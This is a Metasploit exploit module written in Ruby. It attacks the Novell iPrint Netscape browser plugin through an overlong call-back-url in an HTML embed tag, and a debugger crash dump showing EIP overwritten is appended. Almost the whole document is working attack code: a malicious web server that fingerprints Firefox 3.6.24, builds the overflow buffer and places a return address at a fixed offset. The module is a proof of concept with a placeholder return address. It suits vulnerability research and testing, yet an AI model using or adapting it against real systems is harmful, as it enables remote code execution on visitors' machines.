require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell iPrint Client Netscape Plugin call-back-url PoC',
			'Description'    => %q{
					This module is simply a trigger for the Mozilla browser plugin npnipp.dll.
				This module was tested against npnipp.dll iPrint Plugin 1.0.0.1.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-298/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'	=> "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 / FireFox 3.6.24', { 'Ret' => 0x41414141 } ]
				],
			'DisclosureDate' => 'Dec 26 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def auto_target(cli, request)

		mytarget = nil

		agent = request.headers['User-Agent']	
		
		if agent =~ /Firefox\/3\.6\.24/
			mytarget = targets[0]
		else
			print_error("Unsupported target..")
		end
		
		mytarget
	end	

	def on_request_uri(cli, request)

		mytarget = target

		if target.name == 'Windows XP SP3 / FireFox 3.6.24'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		sploit = pattern_create(1024)
		sploit[485, 4] = [target.ret].pack('V')

		content = %Q|
<html>
<body>
<embed type=application/x-Novell-ipp
operation=op-client-interface-version
call-back-url=http://#{sploit}
result-type=url
</embed>
</body>
</html>
		|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
__END__
(d2c.ef8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000004 ecx=104d347c edx=00650040 esi=0012f048 edi=0012f294
eip=41414141 esp=0012f238 ebp=00000000 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
0:000> dd esp
0012f238  41337141 71413471 36714135 41377141
0012f248  71413871 30724139 41317241 72413272
0012f258  34724133 41357241 72413672 38724137
0012f268  41397241 73413073 32734131 41337341
0012f278  73413473 36734135 41377341 73413873
0012f288  30744139 41317441 74413274 34744133
0012f298  41357441 74413674 38744137 41397441
0012f2a8  75413075 32754131 41337541 75413475
